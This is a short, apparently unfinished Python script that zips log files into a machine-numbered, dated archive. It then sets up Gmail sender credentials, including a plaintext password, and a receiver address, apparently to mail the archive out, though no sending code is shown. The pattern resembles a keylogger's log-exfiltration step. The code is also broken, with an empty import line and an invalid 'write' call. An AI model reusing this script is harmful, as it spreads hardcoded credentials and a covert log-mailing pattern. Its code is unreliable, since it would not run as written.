#import 
import smtplib
from zipfile import ZipFile
import datetime



m = datetime.date.today()
zipObj = ZipFile('Machine_0001-'+str(m)+ '.zip','w')

zipObj.write(*'.log')

zipObj.close()

sender = "faulkinc00001@gmail.com"
passwd = "4pQt2sWGpUBtjQP"
reciver = "dfaulk3446@gmail.com"
